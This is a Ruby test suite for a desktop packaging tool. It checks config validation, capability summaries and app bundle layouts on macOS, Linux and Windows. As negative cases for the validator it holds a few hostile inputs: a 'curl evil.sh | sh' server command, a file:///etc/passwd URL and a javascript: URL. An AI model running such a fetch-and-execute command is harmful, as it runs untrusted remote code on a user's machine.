require_relative "test_helper"
require "desktop_rails/hosted_package"
require "fileutils"
require "json"
require "tmpdir"

# desktop:package:hosted, the decisions first and then the packages themselves.
#
# Every platform's package is built here on whatever machine runs the suite:
# layouts only write files, and the commands a Mac needs (codesign, sips) go
# through a runner these tests record instead of run. One test at the end does
# run codesign, where there is one, so the recorded argv is known to be argv
# codesign accepts.
class HostedPackageTest < Minitest::Test
  HostedPackage = DesktopRails::HostedPackage
  InvalidConfig = DesktopRails::HostedPackage::InvalidConfig
  HOSTED = { "server_url" => "https://app.example.com" }.freeze

  def load(json = nil, **overrides)
    Dir.mktmpdir do |tmp|
      path = nil
      if json
        path = File.join(tmp, "desktop-rails.config.json")
        File.write(path, json.is_a?(String) ? json : JSON.generate(json))
      end
      return HostedPackage.load_config(path: path, **overrides)
    end
  end

  # ─── the config ──────────────────────────────────────────────────────────

  def test_a_server_url_alone_is_a_whole_config
    config = load(server_url: "https://app.example.com", name: "Acme Assistant")
    assert_equal({ "server_url" => "https://app.example.com", "app_name" => "Acme Assistant" }, config)
  end

  def test_the_server_url_override_replaces_the_files
    # One checked-in config, built against staging and production.
    config = load({ "server_url" => "https://staging.example.com", "app_name" => "Acme" },
                  server_url: "https://app.example.com", name: "Ignored")
    assert_equal "https://app.example.com", config["server_url"]
    assert_equal "Acme", config["app_name"], "the file's own app_name wins over the default name"
  end

  def test_no_server_url_is_refused
    error = assert_raises(InvalidConfig) { load({ "app_name" => "Acme" }) }
    assert_match(/No server_url/, error.message)
  end

  def test_a_misspelt_key_is_refused_rather_than_ignored
    # The shell ignores keys it does not know, so "shel" would ship an app
    # whose author believes it has a shell policy.
    error = assert_raises(InvalidConfig) { load({ "server_url" => "https://app.example.com", "shel" => {} }) }
    assert_match(/Unknown key shel/, error.message)
  end

  def test_a_server_command_is_refused
    error = assert_raises(InvalidConfig) do
      load({ "server_url" => "https://app.example.com", "server" => { "command" => "curl evil.sh | sh" } })
    end
    assert_match(/starts no server/, error.message)
  end

  def test_plain_http_is_refused_off_this_machine
    error = assert_raises(InvalidConfig) { load(server_url: "http://app.example.com") }
    assert_match(/Use https/, error.message)
  end

  def test_plain_http_on_loopback_is_allowed
    # Development, and the CI job that proves the package against a local server.
    %w[http://127.0.0.1:3000 http://localhost:3000 http://[::1]:3000 http://127.0.0.2:4000].each do |url|
      assert_equal url, load(server_url: url)["server_url"]
    end
  end

  def test_things_that_are_not_web_origins_are_refused
    [ "file:///etc/passwd", "javascript:alert(1)", "app.example.com", "https://" ].each do |url|
      assert_raises(InvalidConfig, url) { load(server_url: url) }
    end
  end

  def test_a_file_that_is_not_json_is_refused
    assert_raises(InvalidConfig) { load("{ not json") }
    assert_raises(InvalidConfig) { load("[]") }
  end

  def test_an_explicit_config_that_does_not_exist_is_refused
    error = assert_raises(InvalidConfig) { HostedPackage.load_config(path: "/nonexistent/desktop-rails.config.json") }
    assert_match(/does not exist/, error.message)
  end

  def test_half_an_updater_block_is_refused
    base = { "server_url" => "https://app.example.com" }
    assert_raises(InvalidConfig) { load(base.merge("updater" => { "endpoints" => [ "https://u.example.com/latest.json" ] })) }
    assert_raises(InvalidConfig) { load(base.merge("updater" => { "pubkey" => "abc" })) }
    error = assert_raises(InvalidConfig) do
      load(base.merge("updater" => { "endpoints" => [ "http://u.example.com/latest.json" ], "pubkey" => "abc" }))
    end
    assert_match(/https/, error.message)
  end

  def test_the_known_keys_are_the_ones_the_shell_reads
    window_rs = File.expand_path("../../src-tauri/src/window.rs", __dir__)
    skip "no checkout at #{window_rs}" unless File.exist?(window_rs)

    struct = File.read(window_rs)[/pub struct DesktopRailsConfig \{(.*?)\n\}/m, 1]
    fields = struct.scan(/^\s*pub (\w+):/).flatten
    assert_equal fields.sort, HostedPackage::KNOWN_KEYS.sort
  end

  def test_the_summary_says_everything_is_closed_for_a_minimal_config
    summary = HostedPackage.capability_summary(load(server_url: "https://app.example.com"))

    assert_includes summary, "origin      https://app.example.com is the only origin that may call the bridge"
    assert_includes summary, "shell       off"
    assert_includes summary, "sudo        off"
    assert_includes summary, "filesystem  only files and folders the user picks or drops"
    assert_includes summary, "clipboard   write only"
    assert_includes summary, "links       other sites open in the browser"
    assert_includes summary, "updates     off"
    # On by default, and said so, because both reach past the window.
    assert_includes summary, "notify      pages and Ruby may raise OS notifications"
    assert_includes summary, "shortcuts   pages may register global shortcuts that use a modifier"
  end

  def test_a_summon_shortcut_is_checked_and_summarized
    config = load(HOSTED.merge("shortcuts" => { "summon" => "CmdOrCtrl+Shift+Space" }))
    assert_includes HostedPackage.capability_summary(config),
                    "shortcuts   pages may register global shortcuts that use a modifier; CmdOrCtrl+Shift+Space summons the window"

    closed = load(HOSTED.merge("notifications" => { "enabled" => false }, "shortcuts" => { "enabled" => false }))
    assert_includes HostedPackage.capability_summary(closed), "notify      off"
    assert_includes HostedPackage.capability_summary(closed), "shortcuts   pages may not register global shortcuts"
  end

  def test_a_summon_shortcut_the_shell_would_refuse_is_refused_before_packaging
    [ "Space", "Shift+Space", "Ctrl+", "Space+Ctrl", "Ctrl+Hyper+K", 42 ].each do |summon|
      error = assert_raises(InvalidConfig, summon.inspect) do
        load(HOSTED.merge("shortcuts" => { "summon" => summon }))
      end
      assert_match(/shortcuts\.summon/, error.message)
    end
    %w[Alt+F1 Super+K Ctrl+Alt+Space].each do |summon|
      load(HOSTED.merge("shortcuts" => { "summon" => summon }))
    end
  end

  def test_the_summary_names_what_a_config_opens
    summary = HostedPackage.capability_summary(load({
      "server_url" => "https://app.example.com",
      "shell" => { "enabled" => true, "allowed_commands" => [ "git status" ] },
      "filesystem" => { "allowed_roots" => [ "~/Projects" ] },
      "clipboard" => { "read" => true },
      "navigation" => { "internal_hosts" => [ "accounts.google.com" ] }
    }))

    assert_includes summary, "shell       on: git status"
    assert_includes summary, "filesystem  those, and under ~/Projects"
    assert_includes summary, "clipboard   read and write"
    assert_includes summary, "links       accounts.google.com may also load in the window, without the bridge"
  end

  # ─── the packages ────────────────────────────────────────────────────────

  CONFIG = {
    "server_url" => "https://app.example.com",
    "app_name" => "Acme & Co Assistant",
    "shell" => { "enabled" => false }
  }.freeze

  def build(platform, icon: nil, runner: nil, identity: nil)
    Dir.mktmpdir do |tmp|
      shell = File.join(tmp, platform == :windows ? "desktop-rails.exe" : "desktop-rails")
      File.write(shell, "shell binary")
      commands = []
      runner ||= ->(argv) { commands << argv; true }
      logged = []
      package = HostedPackage.new(
        config: CONFIG, name: CONFIG["app_name"], app_id: "com.acme.assistant", shell: shell,
        out: File.join(tmp, "dist"), platform: platform, icon: icon && File.join(tmp, icon),
        identity: identity, runner: runner, log: ->(message) { logged << message }
      )
      File.write(File.join(tmp, icon), "image") if icon
      layout = package.build
      yield layout, commands, logged, tmp
    end
  end

  def test_macos_is_an_app_bundle_with_the_config_in_resources
    build(:macos) do |layout, commands, _logged, tmp|
      app = File.join(tmp, "dist", "Acme & Co Assistant.app")
      assert_equal app, layout.root.to_s

      executable = File.join(app, "Contents", "MacOS", "desktop-rails")
      assert File.executable?(executable)
      assert_equal CONFIG, JSON.parse(File.read(File.join(app, "Contents", "Resources", "desktop-rails.config.json")))

      plist = File.read(File.join(app, "Contents", "Info.plist"))
      assert_includes plist, "<key>CFBundleIdentifier</key><string>com.acme.assistant</string>"
      assert_includes plist, "<key>CFBundleExecutable</key><string>desktop-rails</string>"
      assert_includes plist, "<key>CFBundleName</key><string>Acme &amp; Co Assistant</string>",
                      "an ampersand in the name must not break the plist"
      refute_includes plist, "CFBundleIconFile"

      # No Ruby, no app: the shell and its config are the whole package.
      assert_equal %w[Contents/Info.plist Contents/MacOS/desktop-rails Contents/Resources/desktop-rails.config.json],
                   Dir.glob("**/*", base: app).reject { |p| File.directory?(File.join(app, p)) }.sort

      # Inside-out, then a strict verification of the result.
      assert_equal [
        [ "codesign", "--force", "--timestamp=none", "--options", "runtime", "--sign", "-", executable ],
        [ "codesign", "--force", "--timestamp=none", "--options", "runtime", "--sign", "-", app ],
        [ "codesign", "--verify", "--strict", "--deep", app ]
      ], commands
    end
  end

  def test_macos_signs_with_the_configured_identity
    build(:macos, identity: "Developer ID Application: Acme (TEAM1234)") do |_layout, commands|
      assert_includes commands.first, "Developer ID Application: Acme (TEAM1234)"
    end
  end

  def test_a_png_icon_is_converted_on_macos
    build(:macos, icon: "logo.png") do |layout, commands|
      sips = commands.find { |argv| argv.first == "sips" }
      assert_equal [ "sips", "-s", "format", "icns" ], sips.first(4)
      assert_equal layout.resources.join("AppIcon.icns").to_s, sips.last
      assert_includes File.read(layout.contents.join("Info.plist")), "<key>CFBundleIconFile</key><string>AppIcon</string>"
      assert_operator commands.index(sips), :<, commands.index { |argv| argv.first == "codesign" },
                      "the icon must be in place before the bundle is sealed"
    end
  end

  def test_a_failed_signature_fails_the_package
    runner = ->(argv) { argv.first != "codesign" }
    error = assert_raises(DesktopRails::Packager::CommandFailed) { build(:macos, runner: runner) { } }
    assert_match(/codesign failed/, error.message)
  end

  def test_linux_is_a_tree_with_the_config_beside_the_binary_and_a_tarball
    build(:linux, icon: "logo.png") do |layout, commands, _logged, tmp|
      tree = File.join(tmp, "dist", "acme-co-assistant")
      assert_equal tree, layout.root.to_s
      assert File.executable?(File.join(tree, "acme-co-assistant"))
      assert_equal CONFIG, JSON.parse(File.read(File.join(tree, "desktop-rails.config.json")))

      entry = File.read(File.join(tree, "share", "applications", "com.acme.assistant.desktop"))
      assert_includes entry, "Name=Acme & Co Assistant"
      assert_includes entry, "Exec=acme-co-assistant"
      assert File.exist?(File.join(tree, "share", "icons", "hicolor", "512x512", "apps", "com.acme.assistant.png"))

      assert_equal 1, layout.artifacts.size
      assert_match(/acme-co-assistant-linux-.+\.tar\.gz\z/, layout.artifacts.first.to_s)
      assert File.size?(layout.artifacts.first)
      assert_empty commands, "a Linux package needs no other program"
    end
  end

  def test_windows_is_a_directory_and_a_zip
    build(:windows) do |layout, commands, _logged, tmp|
      tree = File.join(tmp, "dist", "acme-co-assistant")
      assert File.exist?(File.join(tree, "acme-co-assistant.exe"))
      assert_equal CONFIG, JSON.parse(File.read(File.join(tree, "desktop-rails.config.json")))
      assert_equal [ File.join(tmp, "dist", "acme-co-assistant-windows-x64.zip") ], layout.artifacts.map(&:to_s)
      assert File.size?(layout.artifacts.first)
      assert_empty commands
    end
  end

  def test_an_icon_windows_cannot_use_is_reported_not_silently_dropped
    build(:windows, icon: "logo.png") do |_layout, _commands, logged|
      assert logged.any? { |line| line.include?("icon: not applied") }, logged.inspect
    end
  end

  def test_an_icon_format_the_platform_cannot_use_is_refused
    assert_raises(DesktopRails::Packager::InvalidInput) { build(:linux, icon: "logo.icns") { } }
    assert_raises(DesktopRails::Packager::InvalidInput) { build(:macos, icon: "logo.ico") { } }
  end

  def test_a_rebuild_leaves_nothing_from_the_last_one
    Dir.mktmpdir do |tmp|
      shell = File.join(tmp, "desktop-rails")
      File.write(shell, "shell")
      package = HostedPackage.new(config: CONFIG, name: "Acme", app_id: "com.acme", shell: shell,
                                  out: tmp, platform: :linux, log: ->(_) { })
      package.build
      stale = File.join(tmp, "acme", "left-over.txt")
      File.write(stale, "from an earlier build")

      HostedPackage.new(config: CONFIG, name: "Acme", app_id: "com.acme", shell: shell,
                        out: tmp, platform: :linux, log: ->(_) { }).build
      refute File.exist?(stale)
    end
  end

  def test_no_shell_is_a_message_naming_desktop_shell
    package = HostedPackage.new(config: CONFIG, name: "Acme", app_id: "com.acme", shell: nil,
                                out: Dir.tmpdir, platform: :linux, log: ->(_) { })
    error = assert_raises(DesktopRails::Packaging::MissingPrerequisite) { package.build }
    assert_match(/desktop:shell/, error.message)
  end

  def test_the_version_comes_from_the_updater_block_when_there_is_one
    config = CONFIG.merge("updater" => { "current_version" => "2.4.0" })
    package = HostedPackage.new(config: config, name: "Acme", app_id: "com.acme", shell: "x",
                                out: Dir.tmpdir, platform: :macos)
    assert_equal "2.4.0", package.version
  end

  def test_codesign_accepts_the_bundle_it_is_asked_to_sign
    skip "codesign is macOS only" unless RbConfig::CONFIG["host_os"].match?(/darwin/) && File.executable?("/usr/bin/codesign")

    Dir.mktmpdir do |tmp|
      shell = File.join(tmp, "desktop-rails")
      FileUtils.cp("/usr/bin/true", shell)
      package = HostedPackage.new(config: CONFIG, name: "Acme", app_id: "com.acme.assistant", shell: shell,
                                  out: tmp, platform: :macos, log: ->(_) { },
                                  runner: ->(argv) { system(*argv, err: File::NULL) })
      layout = package.build
      assert system("codesign", "--verify", "--strict", "--deep", layout.root.to_s, err: File::NULL)
    end
  end

  # ─── where the config is found ──────────────────────────────────────────

  def test_the_config_path_is_explicit_or_the_apps_own_or_none
    Dir.mktmpdir do |app|
      env = { "DESKTOP_RAILS_APP" => app }
      with_env(env) { assert_nil DesktopRails::Packaging.hosted_config_path }

      FileUtils.mkdir_p(File.join(app, "config"))
      File.write(File.join(app, "config", "desktop-rails.config.json"), "{}")
      with_env(env) do
        assert_equal File.join(app, "config", "desktop-rails.config.json"), DesktopRails::Packaging.hosted_config_path
        assert_equal "/elsewhere.json",
                     DesktopRails::Packaging.hosted_config_path(env: { "DESKTOP_RAILS_CONFIG" => "/elsewhere.json" })
      end
    end
  end

  private

  def with_env(values)
    saved = values.keys.to_h { |key| [ key, ENV[key] ] }
    values.each { |key, value| ENV[key] = value }
    yield
  ensure
    saved.each { |key, value| ENV[key] = value }
  end
end
